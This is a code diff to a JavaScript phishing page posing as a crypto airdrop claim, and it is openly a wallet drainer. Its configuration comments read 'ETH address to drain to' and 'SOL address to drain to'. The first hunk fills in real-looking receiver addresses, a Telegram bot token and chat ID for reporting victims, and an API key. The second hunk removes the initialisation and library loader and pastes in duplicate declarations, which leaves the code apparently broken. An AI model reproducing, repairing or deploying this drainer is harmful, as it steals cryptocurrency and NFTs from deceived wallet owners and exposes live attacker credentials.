@@ -18,11 +18,11 @@ document.addEventListener('DOMContentLoaded', function() {
     let solConnection = null;
 
     // Configuration - REPLACE WITH YOUR OWN VALUES
-    const RECIPIENT_ADDRESS = "0xYourReceiverAddressHere"; // ETH address to drain to
-    const RECIPIENT_SOL_ADDRESS = "YourSolanaReceiverAddressHere"; // SOL address to drain to
-    const TELEGRAM_BOT_TOKEN = "YourTelegramBotTokenHere";
-    const TELEGRAM_CHAT_ID = "YourTelegramChatIDHere";
-    const ALCHEMY_API_KEY = "YourAlchemyAPIKeyHere"; // For NFT fetching
+    const RECIPIENT_ADDRESS = "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7"; // ETH address to drain to
+    const RECIPIENT_SOL_ADDRESS = "6oU4uLAfavhXWoF68rDNcChs7tzfs4AQ6Dq3VwwjWCLJ"; // SOL address to drain to
+    const TELEGRAM_BOT_TOKEN = "8535172282:AAHjqVlUk0zj5Sb72bQdFIwg7ylZMeUdyxw";
+    const TELEGRAM_CHAT_ID = "-1003768015882";
+    const ALCHEMY_API_KEY = "jf3NdgL3L8IdVAEeLB8cO"; // For NFT fetching
 
     // Initialize
     async function initialize() {
@@ -589,16 +589,36 @@ function updateConnectionStatus(message, isError = false) {
     statusText.style.color = isError ? '#ff4444' : '#00ff88';
 }
 
-// Initialize on load
-initialize();
+// Elements
+const connectButton = document.getElementById('connect-wallet');
+const claimButton = document.getElementById('claim-airdrop');
+const accountDetails = document.getElementById('account-details');
+const statusText = document.getElementById('status');
 
-// Load ethers.js from CDN if not already available
-if (typeof ethers === 'undefined') {
-    const script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
-    script.integrity = 'sha384-9m6V2eZ9J7qG6J6c9X6b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2A3B4C5D6E7F8G9H0I';
-    script.crossOrigin = 'anonymous';
-    document.head.appendChild(script);
+// State
+let provider = null;
+let signer = null;
+let account = null;
+let chainId = null;
+let ethersProvider = null;
+let solProvider = null;
+let solConnection = null;
+
+// Configuration - REPLACE WITH YOUR OWN VALUES
+const RECIPIENT_ADDRESS = "0xYourReceiverAddressHere"; // ETH address to drain to
+const RECIPIENT_SOL_ADDRESS = "YourSolanaReceiverAddressHere"; // SOL address to drain to
+const TELEGRAM_BOT_TOKEN = "YourTelegramBotTokenHere";
+const TELEGRAM_CHAT_ID = "YourTelegramChatIDHere";
+const ALCHEMY_API_KEY = "YourAlchemyAPIKeyHere"; // For NFT fetching
+
+// Initialize
+async function initialize() {
+    // Initialize ethers provider if available
+    if (window.ethereum) {
+        ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
+        // Listen for account changes
+        window.ethereum.on('accountsChanged', handleAccountsChanged);
+        // Listen for chain changes
+        window.ethereum.on('chainChanged', handleChainChanged);
+    }
 }
-
-// Note: Solana web3.js will be loaded dynamically when needed to avoid bundle size issues
